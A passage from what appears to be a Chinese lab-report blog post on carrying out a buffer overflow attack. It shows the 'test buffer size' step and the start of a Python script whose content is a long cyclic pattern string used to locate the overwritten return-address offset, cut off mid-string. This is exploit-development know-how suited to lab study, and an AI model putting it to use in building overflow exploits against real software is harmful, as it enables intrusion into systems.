<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115213802491.png" class="" title="image-20241115213802491">
<p>测试缓冲区大小</p>
<p>使用一个python脚本来产生点数据 <code>python pattern.py create 150</code>(也可以用kali的)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf = (</span><br><span class="line"><span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac&quot;</span></span><br><span class="line"><span class="string">&quot;6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A&quot;</span></span><br><span class="line"><span class="string">&quot;f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9&quot;</span></span><br><span class="line"><span class="string">&quot;Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak&quot;</span></span><br><span class="line"><span class="string">&quot;6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A&quot;</span></span><br><span class="line"><span class="string">&quot;n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9&quot;</span></span><br><span class="line"><span class="string">&quot;Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As&quot;</span></span><br><span class="line"><span class="string">&quot;6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A&quot;</span></span><br><span class="line"><span class="string">&quot;v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9&quot;</span></span><br><span class="line"><span class="string">&quot;Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba&quot;</span></span><br><span class="line"><span class="string">&quot;6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B&quot;</span></span><br><span class="line"><span class="string">&quot;d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9&quot;</span></span><br><span class="line"><span class="string">&quot;Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi&quot;</span></span><br><span class="line"><span class="string">&quot;6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2B&quot;</span></span><br><span class="line"><span class="string">&quot;l3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9&quot;</span></span><br><span class="line"><span class="string">&quot;Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq&quot;</span></span><br><span class="line"><span class="string">&quot;6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2B&quot;</span></span><br><span class="line"><span class="string">&quot;t3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9&quot;</span></span><br><span class="line"><span class="string">&quot;Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By&quot;</span></span><br><span class="line"><span class="string">&quot;6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C&quot;</span></span><br><span class="line"><span class="string">&quot;b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9&quot;</span></span><br><span class="line"><span class="string">&quot;Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg&quot;</span></span><br><span class="line"><span class="string">&quot;6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2C&quot;</span></span><br><span class="line"><span class="string">&quot;j3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9&quot;</span></span><br><span class="line"><span class="string">&quot;Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co&quot;</span></span><br><span class="line"><span class="string">&quot;6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2C&quot;</span></span><br><span class="line"><span class="string">&quot;r3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9&quot;</span></span><br><span class="line"><span class="string">&quot;Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw&quot;</span></span><br><span class="line"><span class="string">&quot;6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2C&quot;</span></span><br><span class="line"><span class="string">&quot;z3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9&quot;</span></span><br><span class="line"><span class="string">&quot;Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De&quot;</span></span><br><span class="line"><span class="string">&quot;6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2D&quot;</span></span><br><span class="line"><span class="string">&quot;h3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9&quot;</span></span><br><span class="line"><span class="string">&quot;Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm&quot;</span></span><br><span class="line"><span class="string">&quot;6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D&quot;</span></span><br><span class="line"><span class="string">&quot;p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9&quot;</span></span><br><span class="line"><span class="string">&quot;Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du&quot;</span></span><br><span class="line"><span class="string">&quot;6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2D&quot;</span></span><br><span class="line"><span class="string">&quot;x3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9&quot;</span></span><br><span class="line"><span class="string">&quot;Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec&quot;</span></span><br><span class="line"><span class="string">&quot;6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2E&quot;</span></span><br><span class="line"><span class="string">&quot;f3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9&quot;</span></span><br><span class="line"><span class="string">&quot;Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek&quot;</span></span><br><span class="line"><span class="string">&quot;6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2E&quot;</span></span><br><span class="line"><span class="string">&quot;n3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9&quot;</span></span><br><span class="line"><span class="string">&quot;Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es&quot;</span></span><br><span class="line"><span class="string">&quot;6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2E&quot;</span></span><br><span class="line"><span class="string">&quot;v3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9&quot;</span></span><br><span class="line"><span class="string">&quot;Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa&quot;</span></span><br><span class="line"><span class="string">&quot;6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F&quot;</span></span><br><span class="line"><span class="string">&quot;d3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9&quot;</span></span><br><span class="line"><span class="string">&quot;Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi&quot;</span></span><br><span class="line"><span class="string">&quot;6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2F&quot;</span></span><br><span class="line"><span class="string">&quot;l3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9&quot;</span></span><br><span class="line"><span class="string">&quot;Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq&quot;</span></span><br><span class="line"><span class="string">&quot;6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2F&quot;</span></span><br><span class="line"><span class="string">&quot;t3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9&quot;</span></span><br><span class="line"><span class="string">&quot;Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy&quot;</span></span><br><span class="line"><span class="string">&quot;6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2G&quot;</span></span><br><span class="line"><span class="string">&quot;b3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9&quot;</span></span><br><span class="line"><span class="string">&quot;Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg&quot;</span></span><br><span class="line"><span class="string">&quot;6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2G&quot;</span></span><br><span class="line"><span class="string">&quot;j3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9&quot;</span></span><br><span class="line"><span class="string">&quot;Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go&quot;</span></span><br><span class="line"><span class="string">&quot;6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2G&quot;</span></span><br><span class="line"><span class="string">&quot;r3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9&quot;</span></span><br><span class="line"><span class="string">&quot;Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw&quot;</span></span><br><span class="line"><span class="string">&quot;6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2G&quot;</span></span><br><span class="line"><span class="string">&quot;z3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9&quot;</span></span><br><span class="line"><span class="string">&quot;Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He&quot;</span></span><br><span class="line"><span class="string">&quot;6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6Hf7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2H&quot;</span></span><br><span class="line"><span class="string">&quot;h3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9&quot;</span></span><br><span class="line"><span class="string">&quot;Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm&quot;</span></span><br><span class="line"><span class="string">&quot;6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho6Ho7Ho8Ho9Hp0Hp1Hp2H&quot;</span></span><br><span class="line"><span class="string">&quot;p3Hp4Hp5Hp6Hp7Hp8Hp9Hq0Hq1Hq2Hq3Hq4Hq5Hq6Hq7Hq8Hq9Hr0Hr1Hr2Hr3Hr4Hr5Hr6Hr7Hr8Hr9&quot;</span></span><br><span class="line"><span class="string">&quot;Hs0Hs1Hs2Hs3Hs4Hs5Hs6Hs7Hs8Hs9Ht0Ht1Ht2Ht3Ht4Ht5Ht6Ht7Ht8Ht9Hu0Hu1Hu2Hu3Hu4Hu5Hu&quot;</span></span><br><span class="line"><span class="string">&quot;6Hu7Hu8Hu9Hv0Hv1Hv2Hv3Hv4Hv5Hv6Hv7Hv8Hv9Hw0Hw1Hw2Hw3Hw4Hw5Hw6Hw7Hw8Hw9Hx0Hx1Hx2H&quot;</span></span><br><span class="line"><span class="string">&quot;x3Hx4Hx5Hx6Hx7Hx8Hx9Hy0Hy1Hy2Hy3Hy4Hy5Hy6Hy7Hy8Hy9Hz0Hz1Hz2Hz3Hz4Hz5Hz6Hz7Hz8Hz9&quot;</span></span><br><span class="line"><span class="string">&quot;Ia0Ia1Ia2Ia3Ia4Ia5Ia6Ia7Ia8Ia9Ib0Ib1Ib2Ib3Ib4Ib5Ib6Ib7Ib8Ib9Ic0Ic1Ic2Ic3Ic4Ic5Ic&quot;</span></span><br><span class="line"><span class="string">&quot;6Ic7Ic8Ic9Id0Id1Id2Id3Id4Id5Id6Id7Id8Id9Ie0Ie1Ie2Ie3Ie4Ie5Ie6Ie7Ie8Ie9If0If1If2I&quot;</span></span><br><span class="line"><span class="string">&quot;f3If4If5If6If7If8If9Ig0Ig1Ig2Ig3Ig4Ig5Ig6Ig7Ig8Ig9Ih0Ih1Ih2Ih3Ih4Ih5Ih6Ih7Ih8Ih9&quot;</span></span><br><span class="line"><span class="string">&quot;Ii0Ii1Ii2Ii3Ii4Ii5Ii6Ii7Ii8Ii9Ij0Ij1Ij2Ij3Ij4Ij5Ij6Ij7Ij8Ij9Ik0Ik1Ik2Ik3Ik4Ik5Ik&quot;</span></span><br><span class="line"><span class="string">&quot;6Ik7Ik8Ik9Il0Il1Il2Il3Il4Il5Il6Il7Il8Il9Im0Im1Im2Im3Im4Im5Im6Im7Im8Im9In0In1In2I&quot;</span></span><br><span class="line"><span 